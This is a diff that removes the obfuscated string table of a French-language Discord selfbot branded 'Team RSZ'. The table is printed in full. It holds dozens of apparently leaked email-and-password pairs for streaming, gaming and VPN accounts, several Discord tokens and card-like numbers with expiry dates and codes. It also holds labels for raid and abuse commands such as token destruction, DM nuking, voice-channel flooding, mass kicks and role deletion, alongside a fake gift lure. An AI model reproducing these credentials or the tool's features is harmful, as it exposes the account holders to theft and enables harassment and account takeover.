@@ -1,1 +1,3767 @@
-const _0x3301=['https://discord.gift/rp2Z2sjJPqhjubjrwDDXa4cX','login','poomin085771@gmail.com:555888Min','╟─────────────────────────────────╢','>>>\x20Restock\x20de\x20comptes\x20dofus\x20en\x20cours..','0aA','utf-8','exit','Adrimodzz@yahoo.de:Meerschweinchen1\x20|\x20Expiration\x20=\x202020-06-29\x2020:32:29','youtube','NzA1MDY1MDg1MDU1NTMzMDU3.XqmRHg.ZiFzYah6XYAJs8C1347y8KMnMaM','davidcmulholland@gmail.com:Liam2014\x20|\x20Expiration\x20=\x202019-11-06\x2017:28:04','╟\x20Commande\x20nsfw\x20executé','facebook','help\x20moderation**',':x:\x20**Emote\x20invalide\x20essayez\x20ceci**\x20','Drakoloke:arwen1998\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','https://discord.gift/95BJNgugy5TYrKAEGux6YtWM','discord','`Fait\x20un\x20calin\x20a\x20un\x20membre`','clash\x20royal\x20(text)**','friends','https://media.tenor.com/images/778282e02d511fbc061e1439a5105c6f/tenor.gif','\x20```Gtoken```\x20','stevenkeidel@gmail.com:Justice1\x20\x20Units\x20=\x200\x20Level\x20=\x204\x20Tier\x20=\x20Blue\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[watch-dogs]\x20\x20Platforms\x20=\x20[PS4','roles','geert.van.den.hende@telenet.be:\x20vum13unk','Commande\x20channels\x20list\x20executé','Mercredi','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20WOW64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20discord/0.0.305\x20Chrome/69.0.3497.128\x20Electron/4.0.8\x20Safari/537.36','[Lien\x20pour\x20avoir\x20𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉](Soon)','setAuthor','**Commande\x20Say**','fight','mail','delete\x20all\x20role**','guilds','https://media.tenor.com/images/c9fdb6e3ab914d5b195b11ebd99524d0/tenor.gif','team\x20RSZ\x20zt','gtoken','embeds','5491841044710772|01|2023|806','shaggydude47@hotmail.com:M3tal360','gnotes@cox.net:\x20Rgpj1970','🌙**Pannel\x20de\x20Help**🌙','remove\x20emote','mireageorgiana41@gmail.com:Daimond77','Util','user\x20info\x20(@user)**','╟\x20Commande\x20stop\x20spam\x20executé','mfa_enabled','***gen\x20un\x20nord\x20vpn***','╟\x20Commande\x20Pornhub\x20executé','eduardo821:eduardo24\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','code\x20invalide\x20:\x20\x20','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░\x2088%',':white_check_mark:\x20**Vous\x20avez\x20rejoint\x20la\x20hypesquad\x20\x27bravery\x27**','tyboman300@hotmail.com:InsonperneS23','NTI3MTc1OTA2MDI5MDc2NDky.XWpmzg.hUEOHU1IhhdabT5AozUrZQkn8DQ','║-->\x20[','5491843855540850|04|2023|404','substr','india','getRpcImage','wikjellsson@gmail.com:Dudesons1','https://discord.gift/CPPwF8yzbWeJenqRdCbGZ6GH','╟\x20Commande\x20voice\x20kick\x20executé','ABCDEFGHIJKLMNOPQRSTUVWXYZ',':white_check_mark:\x20**Vous\x20n\x27etes\x20plus\x20afk**','Name:','\x20has\x20been\x20successfully\x20banned\x20https://gfycat.com/playfulfittingcaribou\x20:point_right:\x20','guild','superagent','╟\x20Commande\x20pat\x20executé','netflix','\x20**Ce\x20Fait\x20Explosé\x20Par\x20**💣💥\x20','setRegion','tag','(Commande\x20:\x20{/netflix}\x20Effectuer)\x20\x0a\x20================','online','GengarGrey@gmail.com:092598dlh','`Genere\x20un\x20nitro\x20random`','╟\x20Commande\x20discord\x20executé','\x0ale\x20bot\x20','ivzanini@uol.com.br:\x20ione0104','reply','Congratulations','`Met\x20ton\x20text\x20a\x20l\x27envers`','nick.claro@gmail.com:boomerang\x20Units\x20=\x2050\x20\x20Level\x20=\x2020\x20\x20Tier\x20=\x20Silver\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-4-black-flag,\x20far-cry-3,\x20far-cry-3-blood-dragon,\x20,\x20grow-home,\x20rainbow-six-siege,\x20rainbow-six-siege,\x20steep]\x20Platforms\x20=\x20[PC,\x20PC,\x20PC,\x20ANDROID,\x20PS4,\x20PS4,\x20PC','say\x20(text)**','░░░░░░░░░░\x200%','Sydney','hexColor','adam@winkler.no:9w7s3gzT','Member\x20Count','Pornhub','./config.json','red','help\x20gen','https://media1.tenor.com/images/0d2fb6ad9a6d71c3a018c0b37ffca50b/tenor.gif?itemid=16121044','Tiktok','change\x20hypesquad\x20ballance','***vous\x20pouvez\x20copier\x20coller\x20la\x20liste\x20sur\x20le\x20channel\x20actuel\x20et\x20vous\x20pourrez\x20ensuite\x20faire\x20clique\x20droit\x20sur\x20un\x20pseudo\x20/\x20envoyer\x20un\x20message\x20/\x20add\x20friend\x20ect...***','https://media1.tenor.com/images/839addada9a7785b2da0aed97f441554/tenor.gif?itemid=9280880','mzcvms@gmail.com:Iloveari1\x20|\x20Expiration\x20=\x202019-09-07\x2005:18:10','╟\x20Commande\x20delete\x20all\x20role\x20executé','Gucci','https://discord.gift/rZQe9Pa3bCzrRw4wyQKWBsJV','╟\x20Commande\x20highfive\x20executé','mentionable','users','Ne\x20pas\x20déranger','abcdefghijklmnopqrstuvwxyz','body','mersky17@gmail.com:milobeast13','10%','channels\x20list**','magenta','mentions','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░\x2028%','./Data/backups.json','https://media.tenor.com/images/a506dd0b87c41f1988e4bddf7dc2062d/tenor.gif','Fehriel:pc24041987\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Eniripsa\x20-\x20Niv.\x2082\x20-\x20Pandore]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Pandore\x20=\x209\x20983]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','keep-alive','https://discord.gift/KAeaUr9p8QSt9X3NfWdf7Yz5','le\x20prefix\x20est:\x20\x20','ddos-stop','Commande\x20add\x20emote\x20executé.','all\x20kick','google\x20(text)**','***gen\x20un\x20uplay***','5491840062178813|05|2026|606','@everyone','╟Commande\x20user\x20info\x20executé','`Met\x20un\x20statut\x20Csgo`','**Sondage**','https://canary.discordapp.com/channels/','\x0aTeam\x20RSZ\x0a╔═════════════════════════════════╗\x0a║-->\x20\x20Pseudo\x20:\x20','***gen\x20un\x20spotify***','`Affiche\x20les\x20commandes\x20raid`\x20:no_entry_sign:\x20','waldoworldwide@charter.net:\x20Odlaw366','sixxxis82@gmail.com:machine666\x20Units\x20=\x2050\x20\x20Level\x20=\x2014\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-brotherhood,\x20assassins-creed-III,\x20,\x20.,\x20tom-clancy-the-division]\x20\x20','London','(Commande\x20:\x20{/pornhub}\x20Effectuer)\x20\x0a\x20================','krobinson444@gmail.com:bryant64','50%','Oct','\x20sur\x20Gucci**','╟\x20Commande\x20steal\x20emote\x20executé','setAssetsLargeText','\x0aJe\x20t\x27ai\x20fais\x20gagner\x20le\x20giveaway\x20sur\x20le\x20serveur\x20','66.0','Total\x20d\x27emojis','kory_levesque@outlook.com:Jungope1','array','`Vole\x20la\x20photo\x20de\x20profile\x20de\x20la\x20personne\x20mentionné`','**Commandes\x20Fun**\x20:joy::\x20','\x20sur\x20Clash\x20Of\x20Clan**','gunjitsingh91@gmail.com:flanker143\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20IN\x20|\x20','Nothing','>>>\x20Restock\x20de\x20netflix\x20en\x20cours..','[Lien\x20pour\x20avoir\x20𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉](soon)','react','Tu\x20dois\x20poser\x20une\x20question\x20!','https://discord.gift/6gPfQ3wsWYBs6dyPbyqT4aj3','https://media1.tenor.com/images/123df3be1acfe3306b91e9c3dd6f9438/tenor.gif?itemid=5322596','pat\x20(@user)**','help\x20hack**',':white_check_mark:\x20**Tu\x20joues\x20à\x20','\x208ball\x20[question])','add\x20emote\x20(emote)\x20<name>','RANDOM','\x20https:/','yellow','Tokyo\x20Ghoul','`Envoie\x20les\x20informations\x20d\x27un\x20role`','`Embrasse\x20un\x20membre`','reset**','info\x20token\x20(token)**','punch\x20(@user)**','Channels:','ellenhymns@icloud.com:Wallflower17\x20|\x20Expiration\x20=\x202020-06-23\x2010:51:37',':x:\x20**Veuillez\x20mentionner\x20un\x20utilisateur!**','https://media1.tenor.com/images/bfde037642a618465ba50f4c463b49c3/tenor.gif?itemid=16137557','\x20fait\x20un\x20calin\x20a\x20','Sep',':white_check_mark:\x20**Vous\x20avez\x20rejoint\x20la\x20hypesquad\x20\x27ballance\x27**','jaylen.forbes@yahoo.com:beoncey12','highfive','𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉-𝐱-','`Chargement\x20Fini.`','https://cdn.discordapp.com/attachments/746353600741244938/845599350390521886/unnamed_1.png','slice','osiris_chaoti@hotmail.com:natureangel23','canary','╟\x20Commande\x20boom\x20executé','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░\x2052%','boshi068@gmail.com:kirbyoshi\x20Units\x20=\x200\x20Level\x20=\x2012\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[anno-2070,\x20far-cry-3,\x20rocksmith-2014-edition]\x20\x20Platforms\x20=\x20[PC,\x20PC,\x20PC','help\x20nsfw**','type','marksantos21@msn.com:oct102111\x20|\x20Expiration\x20=\x202022-02-17\x2005:32:05','juppi75:giulia08\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','ginaper94@yahoo.com:Texas1993\x20|\x20Expiration\x20=\x202020-03-14\x2004:58:10','getUTCMilliseconds','5491843012203723|01|2025|780','createEmoji','╟\x20Commande\x20spam\x20executé','\x20sur\x20csgo**','╟\x20Commande\x20apex\x20legends\x20executé','╟\x20Commande\x20token\x20executé','spotify\x20(text)**','un\x20nom\x20de\x20rôle\x20est\x20nécessaire','joshuatownsend28@yahoo.com:July2199\x20|\x20Expiration\x20=\x202019-09-01\x2013:01:14','getUTCSeconds','`Detruit\x20le\x20compte\x20d\x27un\x20utilisateur\x20grace\x20a\x20un\x20token`','discord**','nikeboy32111@gmail.com:monSter1996','Youtube','nollen.hager@gmail.com:safeway1','**Commandes\x20Statut**\x20:performing_arts:\x20:','╟\x20Commande\x20stop\x20ddos\x20voc\x20executé','https://discord.gift/8fWKKutPeqUyMM7ReqvKM7Ab','send','\x20à\x20été\x20mp','virus**','nombre\x20de\x20membres\x20ayant\x20ce\x20role:','`Envoie\x20un\x20chargement`',']:\x20𝐋𝐨𝐚𝐝𝐢𝐧𝐠\x20𝐃𝐢𝐬𝐜𝐨𝐫𝐝\x20𝐕𝐢𝐫𝐮𝐬\x20[▓\x20]\x20𝟏%',':x:\x20**Veuillez\x20executer\x20cette\x20commande\x20dans\x20un\x20serveur!**','`Met\x20un\x20statut\x20Tiktok`','https://media.tenor.com/images/a9730f44f28d959abb4c5b31edc77de8/tenor.gif',':x:\x20**permission\x20insuffisante\x20(embed_links)**\x20','substring','Je\x20renomme\x20tout\x20le\x20monde\x20par\x20','╟\x20Comande\x20friend\x20backup\x20executé','setDetails','`Ban\x20un\x20membre\x20du\x20serveur`',':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20serveur**','norbertkasia55@gmail.com:norbert8\x20|\x20Expiration\x20=\x202020-03-14\x2022:43:13','`Met\x20un\x20statut\x20Hunter\x20x\x20Hunter`','japan','niknaks4.np@googlemail.com:nicola0077',':x:**Veuillez\x20mentionner\x20un\x20utilisateur.**','\x20sur\x20Snapchat**','spotify','\x20sur\x20Youtube**','`Affiche\x20le\x20token\x20d\x27un\x20utilisateur`','`Envoie\x20la\x20liste\x20de\x20tout\x20les\x20roles\x20d\x27un\x20serveur`','twitter','NzAzNjczNjQxNDEzNTA5MjEx.XqSBSQ.ZwpD-Do_c-a5z_ujbbq4iZq9wbQ','toDiscord','setPresence','createRole','nottalala5640@gmail.com:Lalaweki1','roman988998@gmail.com:Pandora98','Brazil','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a╚═════════════════════════════════╝\x20\x0a\x0a','./Data/vkick.json','Fortnite','Vendredi','dunand.guillaume@free.fr:\x20babyc1','\x0aPublic\x20Flags:\x20','𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉-Selbot','Lacoste','elizabeth.aason@hotmail.com:Bethere23','jamesgregory1119@gmail.com:Pineapples19\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20','Rpc','Logs:\x0a╔═════════════════════════════════╗','team','andresnr21@gmail.com:Batman21\x20|\x20Expiration\x20=\x202022-03-18\x2018:59:52','https://discordapp.com/api/v6/hypesquad/online','>\x0a\x0aid\x20du\x20role:\x20','716967712844414996','bluehazard17:1234566aa\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','`Crypte\x20ton\x20text\x20en\x20base64`','Le\x20token:\x20','setImage','Emojis\x20[','╟\x20Commande\x20roblox','hentai**','656030540310380574','╟\x20Commande\x20smile\x20executé','fuck\x20token','hongkong','hastebin-gen','curlinjah@gmail.com:condit2007\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20','roblox\x20(text)**','787QoBqWo','294882584201003009','nsfw-gif**','seanstover1@gmail.com:Soccerboy98','backup\x20friends\x20(<@id>)',':x:\x20**Utilisateur\x20inconnu!**','spw_wanstall@yahoo.co.uk:Tikiman266','getUTCDay','nike\x20(text)**','fuck\x20token\x20(token)**','carloskako2@gmail.com:Lucathor22','`Un\x20autoclaim\x20est\x20en\x20permanance\x20activé\x20sur\x20le\x20self`','ban\x20(@user)**','role\x20info\x20(@role)**','https://discord.gg/PeNMgDtuHU','toxinweb@gmail.com:azoz225','sponsel4@gmail.com:slapjack\x20\x20Units\x20=\x2060\x20\x20Level\x20=\x2016\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-4-black-flag,\x20,\x20rainbow-six-siege,\x20steep,\x20tom-clancy-the-division]\x20Platforms\x20=\x20[PC,\x20ANDROID,\x20PC,\x20PS4,\x20PC]','https://media1.tenor.com/images/8b5711095b0ba786c43b617bf9c675dd/tenor.gif?itemid=15735895','jk@persona.ca:\x20jk911959','startsWith','4k**','Gift\x20:','Verification\x20Level','13584QRqKyD','https://discord.gg/vxGygmGyEq','MANAGE_EMOJIS','Le\x20token\x20','dillow5@gmail.com:johnwall11','`Met\x20un\x20statut\x20Google`','say',':white_check_mark:\x20**Tu\x20regardes\x20','╟\x20Commande\x20minecraft\x20executé','tymeurland@gmail.com:Gurital1999','𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩','toString','https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif',':x:\x20**Aucun\x20utilisateur\x20mentionné**','Nickname','./Data/afk.json','`Supprime\x20tout\x20les\x20salons\x20d\x27un\x20serveur`','pop','leejiashenq123@gmail.com:Shenqga123','peut\x20etre?','setDescription','gucci0','Token\x20invalid!\x0aChange\x20ton\x20token\x20dans\x20le\x20config.json','\x20sur\x20Tiktok**','╟\x20Commande\x20help\x20moderation\x20executé','30%','...','\x20sur\x20Badlion**','setIcon','ryanschaffer1@yahoo.com:Arrowhead10','Mar','canni86@alice.it:\x20cannavaro28','***gen\x20un\x20dofus***','ADMINISTRATOR','https://media.tenor.com/images/6bfc57bde155c401edc1d032de468cd6/tenor.gif','then','check\x20token','Njg5MTU2MzYyMzUzMzc3MzU3.XqVlHw.ZUqihZF1DSq-w4bgCcrblwH1Bcw','blue','ready','52LjvYRi','badlion','justin.jman.weston@gmail.com:hobbit12','\x0aAvatar:\x20','youngkj@mountunion.edu:Raider7293\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20','Vous\x20devez\x20mettre\x20quelque\x20chose\x20à\x20dire\x20!','DJReimei@gmail.com:Toshujin1','1659VWKggZ','email','forEach','`Test\x20d\x27amour`','https://nekobot.xyz/api/image','***gen\x20un\x20metal\x20dungeon***','╟\x20Commande\x20nuke\x20dm\x20executé','https://discord.gift/cNFCnMGRaTBmcyeRu7NSsZqk','https://discord.gift/jNMfGND88PePMVSKnx2YRQGS','oZyGJDamSJ4hmJaaLvzdNo1bLqk','`Met\x20un\x20statut\x20Fortnite`','createSpotifyRpc','mpall','╟\x20Commande\x20reverse\x20executé','anal**','╟\x20Commande\x20stats\x20executé','\x20sur\x20spotify**','\x20\x0a**est\x20100%\x20valide**\x20:white_check_mark:','**Serveur\x20info**','armandbibi:derfderf76\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Agride\x20=\x20]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','kick-all**','help\x20moderation','vvomegavv@gmx.de:Vgn7javl','ass','gucci','Team\x20RSZ',':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20un\x20serveur**','▓▓▓▓▓▓▓▓░░\x2080%','8==:fist:=D\x20','clash\x20of\x20clan\x20(text)**','bbriole@aliceadsl.fr:\x20laurine','setState','bilalyolver@hotmail.com:bilal2003\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20TR\x20|\x20','opp1opp1@yahoo.com.tw:Opp1opp2',']```','deletable','virus','`Envoie\x20un\x20message\x20privé\x20a\x20tout\x20tes\x20amis`','add\x20emote','status','hentai','maxi-mome@bbox.fr:Maxou2005','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░\x2020%','\x20vient\x20de\x20vous\x20envoyer\x20une\x20invatation\x20suspecte\x20','liste\x20des\x20roles:','`Affiche\x20les\x20stats\x20du\x20selfbot`','**Nuking\x20dms...**','{\x22theme\x22:\x22dark\x22}','`Supprime\x20tout\x20les\x20messages`','map','splice','parhat1210@126.com:FarHat4539206','`nuke\x20dm`,,\x20`mp\x20all`,\x20`stop\x20mp\x20all`,\x20`grab\x20pp`,\x20`delete\x20all\x20emote`,\x20`steal\x20emote`,\x20`remove\x20emote`,\x20`emote`,\x20`add\x20emote`\x20`user\x20info`,\x20`serveur\x20info`,\x20`stats`,\x20`restart`,\x20`reset`,\x20`role\x20info`,\x20`encode`,\x20`discord`,\x20`gen\x20token`,\x20`mp\x20friend`,\x20`change\x20hypesquad`','╟\x20Commande\x20kick\x20executé','t.kokiri@hotmail.com:Jordan23\x20|\x20Expiration\x20=\x202021-06-06\x2009:40:18','linknomade:digimon12\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Crocabulia\x20=\x20242]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','daniel.wladika@gmx.at:daniel1232','╟\x20Commande\x20mp\x20friend\x20executé','Dimanche','help\x20statut**','Hunter\x20X\x20Hunter','╟\x20Commande\x20Skype\x20executé','group','Low','jo.beaumat@orange.fr:\x20oublier11','`Supprime\x20tous\x20les\x20rôles\x20du\x20serveur`','https://discord.gift/9BNtz7PjpCZSV85sNaBsD9nB','╟\x20Commande\x20help\x20hack\x20executé','brazil','uplay','request','skrillexonrunescape@gmail.com:Hodgson235','En\x20ligne','mp\x20friend\x20(message)**','**Pannel\x20de\x20Help\x20Fun**\x20:joy:\x20','liste\x20des\x20salons:','setAssetsLargeImage','bcarl@hotmail.com:Sanders21','**Générateur**','https://discord.gift/TC3W8QrrpmZkb3SsxRzpHTzT','stop\x20mp\x20all**','`Met\x20un\x20statut\x20Pornhub`','tinder\x20(text)**','owner','lacoste','╟\x20Commande\x20gen\x20token\x20executé','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░\x2044%','85%','\x20sur\x20rocket\x20league**','nickname','joinedAt','stats**','Joined','╟\x20\x20Commande\x20deface\x20executé.','\x20pat\x20','NzAzOTY1OTA4Nzk1Nzg1MjM2.XqWRWQ.X0xTTOUYjH6iPOJAz7K-4yp-mzo','help\x20hack','delete','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Bots\x20\x20\x20:\x20','setFooter','╟\x20Commande\x20Snapchat\x20executé','chmoller:!dexter!\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','justinternet1@gmail.com:13Sandwich','Token\x20info','╟\x20Commande\x20fuck\x20token\x20executé','guildDelete',':x:\x20**Cet\x20utilisateur\x20n\x27a\x20pas\x20d\x27avatar!**','***drop\x20un\x20token\x20pour\x20spam\x20(valid)***','***Voila\x20ton\x20compte\x20Dofus\x20:***','restart**','https://media.tenor.com/images/eac8a7b4a0e7c468a31274b80c3958a1/tenor.gif','╟\x20Commande\x20start\x20typing\x20executé','blanxo:dentistA21\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','Badlion','russia','romeox_69@hotmail.com:Chattupon1','╟\x20Commande\x20punch\x20executé',']\x20\x20-\x20\x20','stop\x20auto\x20voice\x20kick\x20(@user)**','paulsifer22@gmail.com:pt042291',':x:\x20**Vous\x20n\x27avez\x20pas\x20les\x20permissions\x20\x22Gérer\x20les\x20emojis\x22\x20sur\x20ce\x20serveur**',':x:**L\x27utilisateur\x20n\x27est\x20pas\x20dans\x20un\x20channel\x20vocal.**','GET','\x0aJ\x27ai\x20pas\x20correctement\x20a\x20reagit\x20au\x20giveaway\x20sur\x20','text','position','lovecalc','8ball','id\x20du\x20role:','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement.**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100%\x20',':x:\x20**Veuillez\x20choisir\x20une\x20emote\x20valide**!','`Donne\x20les\x20infos\x20tout\x20les\x20emojis\x20d\x27un\x20serveur`','╟\x20Commande\x20Among\x20Us\x20executé','stats','Playing','`Envoie\x20une\x20image\x20thigh`','Avatar\x20URL','emote\x20(emote)**','edit','▓▓▓▓▓▓░░░░\x2060%','Twitter','```𝗨𝗻𝗯𝗮𝗻\x20é𝗳𝗳𝗲𝗰𝘁𝘂é```\x20:white_check_mark:','Tinder','createrole**','https://media.tenor.com/images/5b668436338971d42469d7348a5340e5/tenor.gif','jvasquez0206@yahoo.com:October21\x20|\x20Expiration\x20=\x202020-05-05\x2018:45:48','\x20friends.','\x20**','setTimestamp','@here','5491842537001257|03|2025|793','`Envoie\x20un\x20gif\x20qui\x20rougit`','╟\x20Commande\x204k\x20executé','>>>\x20***Voila\x20ton\x20compte\x20Spotify\x20:\x20***','token','delete\x20all\x20emote','603405368940429315','`Met\x20un\x20statut\x20Among\x20us`','get','\x22╟\x20Voici\x20la\x20banniere\x20de\x20','cmd',':x:\x20**Il\x20vous\x20faut\x20les\x20permissions\x20administrateur\x20pour\x20executer\x20cette\x20commande**','discordrpcgenerator','jmordan57@gmail.com:Rousseau1\x20|\x20Expiration\x20=\x202021-08-08\x2001:51:17','flags','Insane','╟\x20Commande\x20remove\x20emote\x20executé','Dadaboro:dadaboro123\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Merkator\x20=\x2030]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0]\x20|\x20Abonné\x20=\x20False','**Commande\x20Token\x20Info**','message','mschuetz82@gmail.com:cecil207','https://discord.gift/cXHje2gUfMNUxyrunHvrxFVw','zerotwo','a6uny9jcMjet2W2LASruribq6VI','node-fetch','json','`Affiche\x20les\x20commandes\x20statut`\x20:performing_arts:','create\x20channel','restart','reverse','Rip\x20;)','destroy','MANAGE_NICKNAMES','`Affiche\x20votre\x20version\x20de\x20discord\x20js`','║-->\x20Vous\x20avez\x20quitté\x20le\x20serveur\x20','U.S.\x20West','thomasmalloy16@yahoo.com:Blackjack12\x20|\x20Expiration\x20=\x202020-09-11\x2007:45:55','/!\x5c\x20Anti\x20mp',':x:\x20**Je\x20suis\x20afk\x20pour\x20la\x20raison**\x20','memberCount','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░\x2092%','ddos\x20voc','skype','reset','\x0aNuméro\x20de\x20telephone:\x20','Claim\x20You\x27re\x20Gift','`check\x20token`,\x20`info\x20token`,\x20`fuck\x20token`,\x20`ddos\x20voc`,\x20`ddos-stop`,\x20`token`','help\x20utile','indexOf','NzAzNjc5ODg5MjA2NjczNDA4.XqSHOw.ykWPBoxWYPaaR0OWEyEa33SojCw','https://discord.gift/TSYhjtk3pd9TnAvmpBG6XYJP','5491840736558127|03|2025|958','calebbp1@gmail.com:Lollypop1','NzAyNTUyMjkzNTkzMDU1MzAz.XqB2Pw.TGdpaNojvIoYKTYFQKMMJK6qF-4','@everyone\x20@here\x20Team\x20RSZ\x20\x0a','╟\x20Commande\x20Clash\x20Of\x20Clan','delete\x20all\x20emote**','reifsteck.marie@gmail.com:Chevalier68','`Affiche\x20les\x20commandes\x20nsfw`\x20:underage:','name\x20all','`Met\x20un\x20statut\x20Tinder`','5491844028363626|06|2022|577','yacine.bouagada1@gmail.com:zidane10\x20|\x20Expiration\x20=\x202019-09-18\x2004:51:06','reidarpedersen@outlook.com:reidar123','Snapchat','An\x20invalid\x20token\x20was\x20provided','Avr','kirisawa:majordome369\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Sacrieur\x20-\x20Niv.\x2038\x20-\x20Pandore,\x20Sadida\x20-\x20Niv.\x2041\x20-\x20Pandore,\x20Enutrof\x20-\x20Niv.\x2039\x20-\x20Pandore,\x20Iop\x20-\x20Niv.\x2037\x20-\x20Pandore,\x20Iop\x20-\x20Niv.\x2043\x20-\x20Pandore]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Pandore\x20=\x203\x20048]\x20|\x20Kamas\x20en\x20attente\x20=\x20[